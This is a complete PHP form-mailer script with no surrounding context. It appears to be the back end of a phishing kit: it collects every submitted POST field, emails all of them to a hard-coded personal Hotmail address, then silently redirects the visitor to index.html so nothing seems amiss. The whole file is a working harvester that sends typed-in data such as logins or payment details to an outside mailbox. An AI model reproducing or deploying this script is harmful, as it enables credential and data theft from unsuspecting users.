<?php
$TO = "c_snip13@hotmail.com";

$h = "From: " . $TO;

$message = "";

while (list($key, $val) = each($HTTP_POST_VARS)) {
$message .= "$key : $val\n";
}

mail($TO, $subject, $message, $h);

Header("Location: index.html");

?>
